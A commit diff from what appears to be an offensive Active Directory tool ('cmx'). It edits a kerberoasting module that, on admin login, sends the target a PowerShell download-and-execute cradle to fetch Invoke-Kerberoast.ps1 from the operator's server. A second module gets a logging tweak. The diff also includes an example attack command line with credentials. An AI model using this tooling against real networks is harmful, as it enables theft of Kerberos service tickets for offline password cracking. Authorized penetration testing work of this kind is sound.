0c7a59baaf32c89235444def703e957dcb4cf36b
awsmhacks <ripr4p@gmail.com>
2019-08-29 13:49:31 -0500

    .

--- cmx/modules/getcompdetails.py
+++ cmx/modules/getcompdetails.py
@@ -51,6 +51,7 @@ class CMXModule:
             request.send_response(200)
             request.end_headers()
             request.wfile.write(self.ps_script.encode())
+            
         else:
             request.send_response(404)
             request.end_headers()
@@ -69,4 +70,4 @@ class CMXModule:
             #pdb.set_trace() #stuff = iter(data.decode().split())    for thing in stuff: print(thing) 
             for line in lines:
                 #line = line.replace('\r\n', '\n').strip()
-                context.log.highlight(line)
+                context.log.results(line)
--- cmx/modules/kerberoast.py
+++ cmx/modules/kerberoast.py
@@ -21,21 +21,20 @@ class CMXModule:
     def options(self, context, module_options):
         """
     Module Options:
-           COMMAND  Invoke-Kerberoast params to pass in (default: '')
-
+        No options
 cmx --verbose smb 192.168.1.1 -u username -p password -M kerberoast -mo '-Credential $Cred -Verbose -Domain testlab.local'
 
         """
         #self.command = '-Credential $Cred -Verbose -Domain testlab.local'
-        self.command = ''
-        if module_options and 'COMMAND' in module_options:
-            self.command = module_options['COMMAND']
-            
+        #self.command = ''
+        #if module_options and 'COMMAND' in module_options:
+        #    self.command = module_options['COMMAND']
+
 
         self.ps_script = clean_ps_script('powershell_scripts/Invoke-Kerberoast.ps1')
 
     def on_admin_login(self, context, connection):
-        command = "Invoke-Kerberoast {} | fl | Out-String".format(self.command)
+        command = "Invoke-Kerberoast | fl | Out-String"
 
         launcher = gen_ps_iex_cradle(context, 'Invoke-Kerberoast.ps1', command, server_os=connection.server_os)
 
@@ -47,7 +46,6 @@ cmx --verbose smb 192.168.1.1 -u username -p password -M kerberoast -mo '-Creden
         if 'Invoke-Kerberoast.ps1' == request.path[1:]:
             request.send_response(200)
             request.end_headers()
-
             request.wfile.write(self.ps_script.encode()) #self.ps_script is the ps1 script itself
 
         else:
